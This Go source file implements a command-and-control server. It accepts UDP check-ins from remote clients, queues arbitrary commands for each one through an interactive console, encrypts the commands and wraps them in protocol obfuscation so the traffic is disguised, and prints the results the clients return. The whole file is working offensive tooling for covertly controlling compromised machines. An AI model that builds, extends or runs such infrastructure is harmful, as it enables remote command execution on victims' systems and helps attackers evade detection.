package c2

import (
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/b1gcat/core/pki"
	"github.com/c-bata/go-prompt"
)

// Server represents a UDP server with interactive console
type Server struct {
	config    *Config
	conn      *net.UDPConn
	clients   map[string]*ClientInfo
	clientsMu sync.RWMutex
	consoleCh chan string
}

// NewServer creates a new UDP server with the given options
func NewServer(opts ...Option) (*Server, error) {
	config := &Config{
		Key:     make([]byte, 16), // Default 16-byte key
		Address: "0.0.0.0:9001",   // Default server address
	}

	for _, opt := range opts {
		opt(config)
	}

	if len(config.Key) != 16 {
		return nil, fmt.Errorf("server: key must be 16 bytes long")
	}

	// Parse server address
	addr, err := net.ResolveUDPAddr("udp", config.Address)
	if err != nil {
		return nil, fmt.Errorf("server: failed to resolve UDP address: %w", err)
	}

	// Create UDP connection
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return nil, fmt.Errorf("server: failed to create UDP listener: %w", err)
	}

	return &Server{
		config:    config,
		conn:      conn,
		clients:   make(map[string]*ClientInfo),
		consoleCh: make(chan string),
	}, nil
}

// WithServerKey sets the encryption key for the server
func WithServerKey(key []byte) Option {
	return func(cfg *Config) {
		cfg.Key = key
	}
}

// WithServerAddress sets the listen address for the server
func WithServerAddress(address string) Option {
	return func(cfg *Config) {
		cfg.Address = address
	}
}

// Start begins the server's main loop
func (s *Server) Start() error {
	// Start UDP listener
	go s.udpListenLoop()

	// Start console processing automatically
	go s.StartConsole()

	// Server runs continuously, we'll exit directly via Stop()
	select {}
}

// Stop terminates the server
func (s *Server) Stop() {
	// Exit directly as requested
	os.Exit(0)
}

func (s *Server) udpListenLoop() {
	buf := make([]byte, 1024)

	for {
		// Set read deadline for UDP reads
		s.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		n, addr, err := s.conn.ReadFromUDP(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			fmt.Printf("server: failed to read from UDP: %v\n", err)
			continue
		}

		go s.handleUDPMessage(buf[:n], addr)
	}
}

func (s *Server) handleUDPMessage(data []byte, addr *net.UDPAddr) {
	// Detect and unwrap protocol if needed
	protocol := DetectProtocol(data)
	if protocol != ProtocolNone {
		wrapper := GetProtocolWrapper(protocol)
		if wrapper != nil {
			var err error
			data, err = wrapper.Unwrap(data)
			if err != nil {
				fmt.Printf("server: failed to unwrap message from %s: %v\n", addr.String(), err)
				return
			}
		}
	}

	// Decode message
	var msg Message
	dec := gob.NewDecoder(bytes.NewReader(data))
	if err := dec.Decode(&msg); err != nil {
		fmt.Printf("server: failed to decode message from %s: %v\n", addr.String(), err)
		return
	}

	// Update client protocol information
	s.clientsMu.Lock()
	client, exists := s.clients[msg.Identifier]
	if !exists {
		client = &ClientInfo{
			Identifier: msg.Identifier,
			SourceIP:   addr,
			Protocol:   protocol,
		}
		s.clients[msg.Identifier] = client
	} else {
		// Update protocol if it's different from current
		if client.Protocol != protocol {
			client.Protocol = protocol
		}
	}
	client.LastSeen = time.Now()
	client.SourceIP = addr
	s.clientsMu.Unlock()

	// Handle message based on type
	switch msg.Type {
	case MessageTypeProbe:
		s.handleProbe(msg, addr)
	case MessageTypeResult:
		s.handleResult(msg, addr)
	default:
		fmt.Printf("server: unknown message type %d from %s\n", msg.Type, addr.String())
	}
}

func (s *Server) handleProbe(msg Message, addr *net.UDPAddr) {
	// Check if there's a pending command
	s.clientsMu.Lock()
	client, exists := s.clients[msg.Identifier]
	var pendingCmd string
	if exists && client.PendingCmd != "" {
		pendingCmd = client.PendingCmd
		client.PendingCmd = "" // Clear pending command
	}
	s.clientsMu.Unlock()

	// If there's a pending command, send it back to the client
	if pendingCmd != "" {
		s.sendCommandToClient(msg.Identifier, addr, pendingCmd)
	}
}

func (s *Server) handleResult(msg Message, addr *net.UDPAddr) {
	// Decrypt result
	decryptedResult, err := pki.Decrypt(s.config.Key, msg.Payload)
	if err != nil {
		fmt.Printf("server: failed to decrypt result from %s: %v\n", addr.String(), err)
		return
	}

	fmt.Printf("server: command result from %s:\n%s\n", msg.Identifier, decryptedResult)
}

func (s *Server) sendCommandToClient(identifier string, addr *net.UDPAddr, cmd string) {
	// Encrypt command
	encryptedCmd, err := pki.Encrypt(s.config.Key, []byte(cmd))
	if err != nil {
		fmt.Printf("server: failed to encrypt command for %s: %v\n", identifier, err)
		return
	}

	// Create command message
	cmdMsg := Message{
		Type:       MessageTypeCommand,
		Identifier: identifier,
		Payload:    encryptedCmd,
	}

	// Encode message
	var buf bytes.Buffer
	en := gob.NewEncoder(&buf)
	if err := en.Encode(cmdMsg); err != nil {
		fmt.Printf("server: failed to encode command for %s: %v\n", identifier, err)
		return
	}

	// Get client's protocol type
	s.clientsMu.RLock()
	client, exists := s.clients[identifier]
	protocol := ProtocolNone
	if exists {
		protocol = client.Protocol
	}
	s.clientsMu.RUnlock()

	// Apply protocol obfuscation if needed
	data := buf.Bytes()
	if protocol != ProtocolNone {
		wrapper := GetProtocolWrapper(protocol)
		if wrapper != nil {
			var err error
			data, err = wrapper.Wrap(data)
			if err != nil {
				fmt.Printf("server: failed to wrap command for %s: %v\n", identifier, err)
				return
			}
		}
	}

	// Send message
	_, err = s.conn.WriteToUDP(data, addr)
	if err != nil {
		fmt.Printf("server: failed to send command to %s: %v\n", addr.String(), err)
		return
	}

	fmt.Printf("server: sent command to %s: %s\n", identifier, cmd)
}

func (s *Server) consoleLoop() {
	fmt.Println("C2 Server Console")
	fmt.Println("Type 'help' for available commands, type '?' to show command suggestions")

	p := prompt.New(
		func(in string) {
			if in == "" {
				return
			}
			// Handle ? command for showing suggestions
			if in == "?" {
				s.showHelp()
				return
			}
			// Send command to processing channel
			s.consoleCh <- in
		},
		func(d prompt.Document) []prompt.Suggest {
			// Only show full command list when user types exactly "?"
			if d.Text == "?" {
				// Command suggestions
				return []prompt.Suggest{
					{Text: "help", Description: "Show help message"},
					{Text: "show", Description: "Show all connected clients"},
					{Text: "execute", Description: "Send command to client"},
					{Text: "quit", Description: "Exit the server"},
					{Text: "exit", Description: "Exit the server"},
				}
			}

			// Only show client IDs when completing execute command
			if strings.HasPrefix(d.GetWordBeforeCursor(), "execute ") {
				clientSuggests := []prompt.Suggest{}
				s.clientsMu.RLock()
				for id := range s.clients {
					clientSuggests = append(clientSuggests, prompt.Suggest{Text: id})
				}
				s.clientsMu.RUnlock()

				return clientSuggests
			}

			// No suggestions for other cases
			return nil
		},
		prompt.OptionPrefix("> "),
		prompt.OptionInputTextColor(prompt.Green),
		prompt.OptionSuggestionTextColor(prompt.White),
		prompt.OptionSelectedSuggestionTextColor(prompt.Black),
		prompt.OptionSelectedSuggestionBGColor(prompt.LightGray),
		prompt.OptionCompletionOnDown(), // Only show suggestions when pressing Tab or Down
	)

	// Start the prompt
	p.Run()

	// When prompt exits, stop the server directly
	s.Stop()
}

// StartConsole starts the server's console processing
func (s *Server) StartConsole() {
	// Start console input loop
	go s.consoleLoop()

	// Process console commands continuously
	for input := range s.consoleCh {
		s.processConsoleCommand(input)
	}
}

func (s *Server) processConsoleCommand(input string) {
	args := strings.Split(input, " ")
	if len(args) == 0 {
		fmt.Print("> ")
		return
	}

	command := strings.ToLower(args[0])

	switch command {
	case "help":
		s.showHelp()
	case "show":
		s.showClients()
	case "execute":
		if len(args) < 3 {
			fmt.Println("Usage: execute <client-identifier> <command>")
			fmt.Print("> ")
			return
		}
		clientID := args[1]
		cmd := strings.Join(args[2:], " ")
		s.executeCommand(clientID, cmd)
	case "quit", "exit":
		s.Stop()
		return
	default:
		fmt.Printf("Unknown command: %s\n", command)
		fmt.Println("Type 'help' for available commands")
	}

	fmt.Print("> ")
}

func (s *Server) showHelp() {
	fmt.Println("Available commands:")
	fmt.Println("  help                Show this help message")
	fmt.Println("  show                Show all connected clients")
	fmt.Println("  execute <id> <cmd>  Send command to client")
	fmt.Println("  quit/exit           Exit the server")
}

func (s *Server) showClients() {
	s.clientsMu.RLock()
	defer s.clientsMu.RUnlock()

	if len(s.clients) == 0 {
		fmt.Println("No connected clients")
		return
	}

	fmt.Printf("%-20s %-20s %-30s\n", "Identifier", "IP Address", "Last Seen")
	fmt.Println(strings.Repeat("-", 70))

	for _, client := range s.clients {
		fmt.Printf("%-20s %-20s %-30s\n",
			client.Identifier,
			client.SourceIP.String(),
			client.LastSeen.Format(time.RFC3339))
	}
}

func (s *Server) executeCommand(clientID string, cmd string) {
	s.clientsMu.Lock()
	defer s.clientsMu.Unlock()

	client, exists := s.clients[clientID]
	if !exists {
		fmt.Printf("Client with identifier '%s' not found\n", clientID)
		return
	}

	// Check if client has been seen recently (within 2 minutes)
	if time.Since(client.LastSeen) > 2*time.Minute {
		fmt.Printf("Client '%s' has not been seen in over 2 minutes\n", clientID)
		fmt.Println("Command will be sent when client sends next probe")
	}

	// Store pending command
	client.PendingCmd = cmd
	fmt.Printf("Command '%s' queued for client '%s'\n", cmd, clientID)
}
